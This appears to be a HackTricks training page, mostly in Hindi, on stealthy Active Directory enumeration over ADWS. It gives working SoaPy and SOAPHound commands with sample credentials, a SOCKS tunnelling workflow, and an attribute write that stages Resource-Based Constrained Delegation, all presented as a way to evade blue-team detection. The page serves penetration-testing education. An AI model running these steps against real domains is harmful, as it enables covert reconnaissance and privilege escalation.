# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## ADWS क्या है?

Active Directory Web Services (ADWS) **Windows Server 2008 R2 से हर Domain Controller पर डिफ़ॉल्ट रूप से सक्षम है** और TCP **9389** पर सुनता है। नाम के बावजूद, **कोई HTTP शामिल नहीं है**। इसके बजाय, सेवा LDAP-style डेटा को एक मालिकाना .NET framing protocols के स्टैक के माध्यम से एक्सपोज़ करती है:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

क्योंकि ट्रैफ़िक इन बाइनरी SOAP फ्रेम्स के अंदर संलग्न होता है और एक असामान्य पोर्ट के माध्यम से यात्रा करता है, **ADWS के माध्यम से enumeration पारंपरिक LDAP/389 & 636 ट्रैफ़िक की तुलना में निरीक्षण, फ़िल्टर या सिग्नेचर किए जाने की संभावना बहुत कम है**। ऑपरेटरों के लिए इसका मतलब है:

* Stealthier recon – Blue teams often concentrate on LDAP queries.
* 9389/TCP को SOCKS proxy के माध्यम से тунल करके **non-Windows hosts (Linux, macOS)** से संग्रह करने की स्वतंत्रता।
* LDAP के माध्यम से मिलने वाला वही डेटा (users, groups, ACLs, schema, आदि) और **writes** करने की क्षमता (उदा. `msDs-AllowedToActOnBehalfOfOtherIdentity` for **RBCD**)।

ADWS इंटरैक्शंस WS-Enumeration पर लागू होते हैं: हर query एक `Enumerate` संदेश से शुरू होती है जो LDAP filter/attributes को परिभाषित करता है और एक `EnumerationContext` GUID लौटाता है, जिसके बाद एक या अधिक `Pull` संदेश आते हैं जो सर्वर-परिभाषित result window तक स्ट्रीम करते हैं। Contexts लगभग 30 मिनट के बाद expire हो जाते हैं, इसलिए टूलिंग को या तो परिणामों को पेज करना होगा या state खोने से बचने के लिए filters को विभाजित करना होगा (CN के अनुसार prefix queries)। जब security descriptors माँगे जाएँ तो `LDAP_SERVER_SD_FLAGS_OID` control निर्दिष्ट करें ताकि SACLs छोड़े जा सकें; अन्यथा ADWS अपने SOAP response से `nTSecurityDescriptor` attribute को सरलता से ड्रॉप कर देता है।

> NOTE: ADWS का उपयोग कई RSAT GUI/PowerShell टूल्स द्वारा भी किया जाता है, इसलिए ट्रैफिक वैध admin गतिविधि के साथ मिश्रित हो सकता है।

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) एक **pure Python में ADWS protocol stack का full re-implementation** है। यह NBFX/NBFSE/NNS/NMF फ्रेम्स को बाइट-बाइ-बाइट क्राफ्ट करता है, जिससे Unix-like सिस्टम्स से बिना .NET runtime छुए संग्रह किया जा सकता है।

### प्रमुख विशेषताएँ

* Supports **proxying through SOCKS** (useful from C2 implants).
* Fine-grained search filters identical to LDAP `-q '(objectClass=user)'`.
* Optional **write** operations ( `--set` / `--delete` ).
* **BOFHound output mode** for direct ingestion into BloodHound.
* `--parse` flag to prettify timestamps / `userAccountControl` when human readability is required.

### Targeted collection flags & write operations

SoaPy curated switches के साथ आता है जो ADWS पर सबसे सामान्य LDAP hunting tasks को दोहराते हैं: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, इसके अलावा custom pulls के लिए raw `--query` / `--filter` knobs। इन्हें write primitives के साथ पेयर करें जैसे `--rbcd <source>` (सेट करता है `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (लक्षित Kerberoasting के लिए SPN staging) और `--asrep` (`userAccountControl` में `DONT_REQ_PREAUTH` को flip करता है)।

Example targeted SPN hunt that only returns `samAccountName` and `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
उसी host/credentials का उपयोग करके findings को तुरंत weaponise करें: RBCD-capable objects को `--rbcds` के साथ dump करें, फिर Resource-Based Constrained Delegation chain को stage करने के लिए `--rbcd 'WEBSRV01$' --account 'FILE01$'` लागू करें (पूरा abuse path देखने के लिए [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) देखें)।

### इंस्टॉलेशन (operator host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## SOAPHound – उच्च-वॉल्यूम ADWS संग्रह (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) एक .NET collector है जो सभी LDAP interactions को ADWS के भीतर रखता है और BloodHound v4-compatible JSON उत्पन्न करता है। यह एक बार `objectSid`, `objectGUID`, `distinguishedName` और `objectClass` का पूरा cache बनाता है (`--buildcache`), फिर हाई-वॉल्यूम `--bhdump`, `--certdump` (ADCS), या `--dnsdump` (AD-integrated DNS) पास के लिए उसे पुनः उपयोग करता है ताकि केवल ~35 critical attributes ही DC छोड़ें। AutoSplit (`--autosplit --threshold <N>`) बड़े forests में 30‑minute EnumerationContext timeout के भीतर बने रहने के लिए CN prefix द्वारा queries को स्वचालित रूप से shard करता है।

डोमेन-जोड़े हुए ऑपरेटर VM पर सामान्य कार्यप्रवाह:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Exported JSON को सीधे SharpHound/BloodHound workflows में उपयोग किया जा सकता है — downstream ग्राफ बनाने के विचारों के लिए [BloodHound methodology](bloodhound.md) देखें। AutoSplit SOAPHound को multi-million ऑब्जेक्ट forests पर अधिक लचीला बनाता है और क्वेरी की संख्या को ADExplorer-style snapshots से कम रखता है।

## Stealth AD संग्रह वर्कफ़्लो

निम्न वर्कफ़्लो दिखाता है कि ADWS के माध्यम से कैसे **domain & ADCS objects** को सूचीबद्ध किया जाए, उन्हें BloodHound JSON में कनवर्ट किया जाए और certificate-based attack paths के लिए खोज की जाए — ये सब Linux से:

1. **Tunnel 9389/TCP** को लक्षित नेटवर्क से अपनी मशीन तक टनल करें (उदाहरण के लिए Chisel, Meterpreter, SSH dynamic port-forward, आदि के माध्यम से)। Export `export HTTPS_PROXY=socks5://127.0.0.1:1080` या SoaPy के `--proxyHost/--proxyPort` का उपयोग करें।

2. **root domain object को इकट्ठा करें:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Configuration NC से ADCS-संबंधित ऑब्जेक्ट्स एकत्र करें:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **BloodHound में परिवर्तित करें:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **ZIP फ़ाइल** को BloodHound GUI में अपलोड करें और `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` जैसे cypher queries चलाएँ ताकि certificate escalation paths (ESC1, ESC8, आदि) उजागर हों।

### `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD) लिखना
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Combine this with `s4u2proxy`/`Rubeus /getticket` for a full **Resource-Based Constrained Delegation** chain (see [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## उपकरण सारांश

| उद्देश्य | टूल | नोट्स |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| High-volume ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | SoaPy/ldapsearch logs को कन्वर्ट करता है |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | उसी SOCKS के माध्यम से प्रॉक्सी किया जा सकता है |

## संदर्भ

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
